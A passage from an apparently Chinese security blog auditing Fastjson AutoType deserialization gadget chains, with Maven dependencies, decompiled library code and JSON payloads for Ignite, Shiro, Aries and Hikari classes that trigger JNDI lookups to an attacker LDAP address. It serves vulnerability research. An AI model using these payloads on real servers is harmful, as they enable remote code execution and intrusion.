-&gt; InitialContext(<span class="hljs-built_in">this</span>.m_jndiProps).lookup(topic-factory)<br></code></pre></td></tr></table></figure><h1 id="FastJson-≤1-2-67-开启AutoType"><a href="#FastJson-≤1-2-67-开启AutoType" class="headerlink" title="FastJson ≤1.2.67 开启AutoType"></a>FastJson ≤1.2.67 开启AutoType</h1><h2 id="CacheJndiTmLookup-要ignite-core、ignite-jta和依赖"><a href="#CacheJndiTmLookup-要ignite-core、ignite-jta和依赖" class="headerlink" title="CacheJndiTmLookup 要ignite-core、ignite-jta和依赖"></a>CacheJndiTmLookup 要ignite-core、ignite-jta和依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//测试&lt;=2.16版本可以利用</span><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;<br>            &lt;artifactId&gt;ignite-core&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">2.16</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;<br>            &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">2.16</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<br>    <span class="hljs-string">&quot;jndiNames&quot;</span>: [<br>        <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;tm&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.tm&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.ignite.cache.jta.jndi;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.transaction.TransactionManager;<br><span class="hljs-keyword">import</span> org.apache.ignite.IgniteException;<br><span class="hljs-keyword">import</span> org.apache.ignite.cache.jta.CacheTmLookup;<br><span class="hljs-keyword">import</span> org.jetbrains.annotations.Nullable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheJndiTmLookup</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CacheTmLookup</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; jndiNames;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CacheJndiTmLookup</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getJndiNames</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.jndiNames;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setJndiNames</span><span class="hljs-params">(List&lt;String&gt; jndiNames)</span> &#123;<br>        <span class="hljs-built_in">this</span>.jndiNames = jndiNames;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-meta">@Nullable</span> TransactionManager <span class="hljs-title function_">getTm</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IgniteException &#123;<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">this</span>.jndiNames != <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">assert</span> !<span class="hljs-built_in">this</span>.jndiNames.isEmpty();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.jndiNames.iterator();<br><br>            Object obj;<br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-keyword">if</span> (!var2.hasNext()) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> (String)var2.next();<br>                obj = ctx.lookup(s);<br>            &#125; <span class="hljs-keyword">while</span>(obj == <span class="hljs-literal">null</span> || !(obj <span class="hljs-keyword">instanceof</span> TransactionManager));<br><br>            <span class="hljs-keyword">return</span> (TransactionManager)obj;<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IgniteException</span>(<span class="hljs-string">&quot;Unable to lookup TM by: &quot;</span> + <span class="hljs-built_in">this</span>.jndiNames, var5);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>setJndiNames</code>的参数是<code>list</code>类型，所以payload为<code>[ &quot;ldap://192.168.100.128:1389/Exploit&quot; ]</code></p><p>对于参数<code>tm</code>只有<code>getTm()</code>而没有<code>setter</code>方法</p><p>调试最后是对<code>jndiNames</code>调用了<code>lookup</code>查询</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747033838038-e1d9a203-7e85-458a-8c0f-09ac77b12766.png"></p><p>这里为什么会调用<code>getter</code>，对于payload中的<code>tm</code>字段用了循环引用，fastjson默认开启</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;tm&quot;</span>: &#123;<br>     <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.tm&quot;</span><br> &#125;<br></code></pre></td></tr></table></figure><p><code>&#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;</code>是一个 <code>JSON-Path </code>引用表达式，表示访问根节点（当前 JSON 根节点下）也就是<code>CacheJndiTmLookup</code>的<code>tm</code>属性，Fastjson 会通过反射调用 <code>getTm() </code>方法（如果存在）或直接访问 <code>tm </code>字段来获取值</p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span> -&gt; setJndiNames -&gt; 发现 `$ref` -&gt; 解析 `$.tm` -&gt; 反射调用 `CacheJndiTmLookup.getTm().lookup(jndiNames)<br></code></pre></td></tr></table></figure><h2 id="JndiObjectFactory-shiro-core依赖"><a href="#JndiObjectFactory-shiro-core依赖" class="headerlink" title="JndiObjectFactory shiro-core依赖"></a>JndiObjectFactory shiro-core依赖</h2><p>pom.xml   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.x版本</span><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;<br>            &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">1.13</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br><span class="hljs-comment">//可有可无</span><br>&lt;!--        &lt;dependency&gt;--&gt;<br>&lt;!--            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;--&gt;<br>&lt;!--            &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;--&gt;<br>&lt;!--            &lt;version&gt;<span class="hljs-number">2.0</span><span class="hljs-number">.17</span>&lt;/version&gt;--&gt;<br>&lt;!--        &lt;/dependency&gt;--&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<br>    <span class="hljs-string">&quot;resourceName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;instance&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.instance&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>D:\maven_repo\org\apache\shiro\shiro-core\1.13.0\shiro-core-1.13.0.jar!\org\apache\shiro\jndi\JndiObjectFactory.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.shiro.jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.Factory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiObjectFactory</span>&lt;T&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JndiLocator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Factory</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> String resourceName;<br>    <span class="hljs-keyword">private</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">T</span>&gt; requiredType;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JndiObjectFactory</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.requiredType != <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.requiredType.cast(<span class="hljs-built_in">this</span>.lookup(<span class="hljs-built_in">this</span>.resourceName, <span class="hljs-built_in">this</span>.requiredType)) : <span class="hljs-built_in">this</span>.lookup(<span class="hljs-built_in">this</span>.resourceName);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.requiredType != <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.requiredType.getName() : <span class="hljs-string">&quot;object&quot;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;Unable to look up &quot;</span> + typeName + <span class="hljs-string">&quot; with jndi name &#x27;&quot;</span> + <span class="hljs-built_in">this</span>.resourceName + <span class="hljs-string">&quot;&#x27;.&quot;</span>, var3);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getResourceName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.resourceName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setResourceName</span><span class="hljs-params">(String resourceName)</span> &#123;<br>        <span class="hljs-built_in">this</span>.resourceName = resourceName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">T</span>&gt; getRequiredType() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.requiredType;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRequiredType</span><span class="hljs-params">(Class&lt;? extends T&gt; requiredType)</span> &#123;<br>        <span class="hljs-built_in">this</span>.requiredType = requiredType;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>只有<code>getInstance</code>没有<code>setter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.requiredType != <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.requiredType.cast(<span class="hljs-built_in">this</span>.lookup(<span class="hljs-built_in">this</span>.resourceName, <span class="hljs-built_in">this</span>.requiredType)) : <span class="hljs-built_in">this</span>.lookup(<span class="hljs-built_in">this</span>.resourceName);<br></code></pre></td></tr></table></figure><p>三元表达式调用了<code>lookup</code>，这里不管<code>requiredType</code>是否为<code>null</code>都调用<code>lookup()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<br>    <span class="hljs-string">&quot;resourceName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;requiredType&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>,<br>    <span class="hljs-string">&quot;instance&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.instance&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样可以触发</p><p>对于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;instance&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.instance&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>同是循环引用，访问根节点（当前 JSON 根节点下）也就是<code>JndiObjectFactory</code>的<code>instance</code>属性，Fastjson 会通过反射调用 <code>getInstance() </code>方法（如果存在）或直接访问 <code>instance</code>字段来获取值</p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span> -&gt; setResourceName -&gt; 发现 `$ref` -&gt; 解析 `$.instance` -&gt; 反射调用 `JndiObjectFactory.getInstance().lookup(ResourceName)<br></code></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="FastJson-≤1-2-69-开启AutoType"><a href="#FastJson-≤1-2-69-开启AutoType" class="headerlink" title="FastJson ≤1.2.69 开启AutoType"></a>FastJson ≤1.2.69 开启AutoType</h1><h2 id="org-apache-aries-transaction-jms-RecoverablePooledConnectionFactory"><a href="#org-apache-aries-transaction-jms-RecoverablePooledConnectionFactory" class="headerlink" title="org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory"></a>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory</h2><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.69</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.aries.transaction&lt;/groupId&gt;<br>    &lt;artifactId&gt;org.apache.aries.transaction.jms&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">2.0</span><span class="hljs-number">.0</span>&lt;/version&gt;    <span class="hljs-comment">//1.x版本没有lookup</span><br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>,<br>    <span class="hljs-string">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;transactionManager&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.transactionManager&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>D:\maven_repo\org\apache\aries\transaction\org.apache.aries.transaction.jms\2.0.0\org.apache.aries.transaction.jms-2.0.0.jar!\org\apache\aries\transaction\jms\RecoverablePooledConnectionFactory.class</code>没有重写getter和setter</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747112107545-eef43da7-2ef5-40aa-8bda-b470b0937ebd.png"></p><p>跟进到父类<code>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory#getTransactionManager</code>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> TransactionManager <span class="hljs-title function_">getTransactionManager</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.transactionManager == <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.tmFromJndi) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.transactionManager = (TransactionManager)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>()).lookup(<span class="hljs-built_in">this</span>.getTmJndiName());<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var2) &#123;<br>            <span class="hljs-keyword">if</span> (LOG.isTraceEnabled()) &#123;<br>                LOG.trace(<span class="hljs-string">&quot;exception on tmFromJndi: &quot;</span> + <span class="hljs-built_in">this</span>.getTmJndiName(), var2);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.transactionManager;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了<code>lookup</code>参数是<code>this.getTmJndiName()</code>，要走到这一步需要满足<code>this.transactionManager == null &amp;&amp; this.tmFromJndi</code>，所以<code>&quot;tmFromJndi&quot;: true</code></p><p>其实父类是有<code>setter</code>方法的</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747114094476-bab86907-5ee0-42a4-972c-c8cea646ef0a.png"></p><p>但因为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;transactionManager&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.transactionManager&quot;</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>循环引用会调用<code>getter</code>，无论是否有<code>setter</code>，并且返回值<code>this.transactionManager</code>为<code>null</code>，因为并没有传入实际的<code>transactionManager</code>的值，并且前面<code>private TransactionManager transactionManager;</code>声明了变量，初始为<code>null</code>所以满足<code>this.transactionManager == null</code></p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span> -&gt; 循环引用$.transactionManager -&gt; XaPooledConnectionFactory#getTransactionManager -&gt; lookup(getTmJndiName)<br></code></pre></td></tr></table></figure><h2 id="org-apache-aries-transaction-jms-internal-XaPooledConnectionFactory（RecoverablePooledConnectionFactory的父类）"><a href="#org-apache-aries-transaction-jms-internal-XaPooledConnectionFactory（RecoverablePooledConnectionFactory的父类）" class="headerlink" title="org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory（RecoverablePooledConnectionFactory的父类）"></a>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory（RecoverablePooledConnectionFactory的父类）</h2><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.69</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;!-- https:<span class="hljs-comment">//mvnrepository.com/artifact/org.apache.aries.transaction/org.apache.aries.transaction.jms --&gt;</span><br>&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.aries.transaction&lt;/groupId&gt;<br>    &lt;artifactId&gt;org.apache.aries.transaction.jms&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">2.0</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>,<br>    <span class="hljs-string">&quot;tmJndiName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;tmFromJndi&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;transactionManager&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.transactionManager&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>D:\maven_repo\org\apache\aries\transaction\org.apache.aries.transaction.jms\2.0.0\org.apache.aries.transaction.jms-2.0.0.jar!\org\apache\aries\transaction\jms\internal\XaPooledConnectionFactory.class</code>其实是上一个<code>RecoverablePooledConnectionFactory</code>的父类</p><h2 id="org-apache-hadoop-shaded-com-zaxxer-hikari-HikariConfig"><a href="#org-apache-hadoop-shaded-com-zaxxer-hikari-HikariConfig" class="headerlink" title="org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"></a>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;<br>    &lt;artifactId&gt;hadoop-client-minicluster&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">3.3</span><span class="hljs-number">.0</span>&lt;/version&gt;   <span class="hljs-comment">//小于3.3.0可用</span><br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<br>    <span class="hljs-string">&quot;metricRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>D:\maven_repo\org\apache\hadoop\hadoop-client-minicluster\3.3.1\hadoop-client-minicluster-3.3.1.jar!\org\apache\hadoop\shaded\com\zaxxer\hikari\HikariConfig.class</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747225843217-f4132125-d344-4fb8-a006-85e6476ab506.png"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">setMetricRegistry`调用了`lookup`参数是`metricRegistry<br></code></pre></td></tr></table></figure><p>另一种payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span 